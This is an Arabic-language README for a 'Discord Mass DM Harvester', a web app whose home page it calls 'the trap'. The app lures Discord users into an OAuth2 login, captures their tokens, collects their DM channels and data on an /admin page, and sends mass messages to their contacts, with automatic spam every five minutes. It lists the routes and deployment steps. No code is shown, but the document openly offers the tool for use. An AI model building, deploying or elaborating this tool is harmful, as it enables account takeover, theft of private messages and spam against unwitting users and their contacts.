# Discord Mass DM Harvester v5

## المميزات
- ✅ يستلم OAuth2 Token
- ✅ يجيب كل DM Channels تلقائياً
- ✅ يرسل Mass DM لكل الناس المكلمهم
- ✅ يحفظ كل البيانات في صفحة /admin
- ✅ Auto-Spam كل 5 دقايق
- ✅ API endpoint للتحكم

## المسارات
| الرابط | الوظيفة |
|--------|---------|
| `/` | الصفحة الرئيسية (الفخ) |
| `/login` | OAuth2 Login |
| `/callback` | يستلم التوكن ويبدأ الحصاد |
| `/admin` | صفحة البيانات المجمعة |
| `/api/data` | JSON API للبيانات |
| `/api/send/<user_id>` | إرسال رسالة مخصصة |

## الإعداد
1. عدل Redirects في Discord Developer Portal
2. شغل الموقع
3. افتح `/admin` تشوف البيانات
